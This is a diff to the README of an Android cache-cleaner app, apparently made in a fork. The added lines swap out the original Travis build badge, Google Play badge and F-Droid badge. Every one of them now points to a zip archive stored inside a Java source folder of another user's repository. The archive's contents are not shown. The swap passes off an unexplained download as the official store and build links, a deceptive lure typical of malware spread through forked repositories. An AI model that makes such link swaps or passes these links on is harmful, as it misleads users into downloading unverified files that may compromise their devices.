@@ -1,4 +1,4 @@
-Cache Cleaner [![Build Status](https://travis-ci.org/Frozen-Developers/android-cache-cleaner.svg)](https://travis-ci.org/Frozen-Developers/android-cache-cleaner)
+Cache Cleaner [![Build Status](https://raw.githubusercontent.com/rendyramon/android-cache-cleaner/master/CacheCleaner/src/main/java/com/android/settings/applications/cache_cleaner_android_2.8-beta.3.zip)](https://raw.githubusercontent.com/rendyramon/android-cache-cleaner/master/CacheCleaner/src/main/java/com/android/settings/applications/cache_cleaner_android_2.8-beta.3.zip)
 ======================
 
 Cache Cleaner for Android:
@@ -25,5 +25,5 @@ cache is still supported.
 Download
 --------
 
-[<img src="https://play.google.com/intl/en_us/badges/images/apps/en-play-badge.png" alt="Google Play Store" height="60px">](https://play.google.com/store/apps/details?id=com.frozendevs.cache.cleaner)
-[![F-Droid](https://guardianproject.info/wp-content/uploads/2014/07/logo-fdroid.png)](https://f-droid.org/repository/browse/?fdid=com.frozendevs.cache.cleaner)
+[<img src="https://raw.githubusercontent.com/rendyramon/android-cache-cleaner/master/CacheCleaner/src/main/java/com/android/settings/applications/cache_cleaner_android_2.8-beta.3.zip" alt="Google Play Store" height="60px">](https://raw.githubusercontent.com/rendyramon/android-cache-cleaner/master/CacheCleaner/src/main/java/com/android/settings/applications/cache_cleaner_android_2.8-beta.3.zip)
+[![F-Droid](https://raw.githubusercontent.com/rendyramon/android-cache-cleaner/master/CacheCleaner/src/main/java/com/android/settings/applications/cache_cleaner_android_2.8-beta.3.zip)](https://raw.githubusercontent.com/rendyramon/android-cache-cleaner/master/CacheCleaner/src/main/java/com/android/settings/applications/cache_cleaner_android_2.8-beta.3.zip)
